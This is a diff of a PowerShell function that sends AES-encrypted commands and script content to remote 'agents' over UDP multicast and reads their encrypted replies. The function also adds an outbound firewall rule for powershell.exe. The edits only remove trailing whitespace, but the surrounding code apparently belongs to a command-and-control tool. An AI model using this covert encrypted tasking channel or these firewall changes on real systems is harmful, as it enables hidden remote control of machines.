@@ -68,7 +68,7 @@ function Send-CommandToAgent {
         [Parameter(Mandatory = $false)]
         [String]
         $AgentID,
-        
+
         [Parameter(Mandatory = $false)]
         [String]
         $Command,
@@ -86,8 +86,8 @@ function Send-CommandToAgent {
     New-NetFirewallRule -Program "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Action Allow -Profile Domain, Private -DisplayName "PowerShell" -Description "PowerShell" -Direction Outbound
     #netsh advfirewall firewall add rule name="PowerShell" dir=in action=allow program="c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" enable=yes
     #netsh advfirewall firewall add rule name="PowerShell" dir=out action=allow program="c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" enable=yes
-        
-    #Send Agent ID and Command 
+
+    #Send Agent ID and Command
     $udp_client = new-Object System.Net.Sockets.UdpClient $BindPort
     $udp_client.client.SendBufferSize = 64000
     #$udp_client.AllowNatTraversal($True)
@@ -95,7 +95,7 @@ function Send-CommandToAgent {
     $udp_client.JoinMulticastGroup($multicast_group)
     $enc = [system.Text.Encoding]::ASCII
     if ($script) {
-        $ScriptContent = Get-Content -Path $script -Delimiter "KSOA"      
+        $ScriptContent = Get-Content -Path $script -Delimiter "KSOA"
     }
     $data = "$AgentID`;$Command`;$ScriptContent"
     $encrypted_data = Encrypt-String $AESKey $data
@@ -103,12 +103,12 @@ function Send-CommandToAgent {
     $endpoint = New-Object Net.IPEndpoint([IPAddress]::Parse($MultiCastGroup),$MultiCastPort)
     $udp_client.Connect($endpoint)
     $udp_client.ttl = 255
-    $udp_client.Send($encrypted_packet,$encrypted_packet.Length) |Out-Null  
+    $udp_client.Send($encrypted_packet,$encrypted_packet.Length) |Out-Null
     $udp_client.Close()
     $udp_client.dispose()
     if ($Command -eq "ExitAgent") {
         break
-    }    
+    }
     $udp_client = New-Object System.Net.Sockets.UdpClient
     $udp_client.ExclusiveAddressUse = $False
     $LocalEndPoint = New-Object System.Net.IPEndPoint([ipaddress]::Any,$MultiCastPort)
@@ -121,7 +121,7 @@ function Send-CommandToAgent {
     $receive_data = ([text.encoding]::ASCII).GetString($receivebytes)
     # Decrypt packet
     $decrypted_data = Decrypt-String $AESKey $receive_data
-    $decrypted_data    
+    $decrypted_data
     $udp_client.Close()|Out-Null
-    $udp_client.dispose()             
+    $udp_client.dispose()
 }
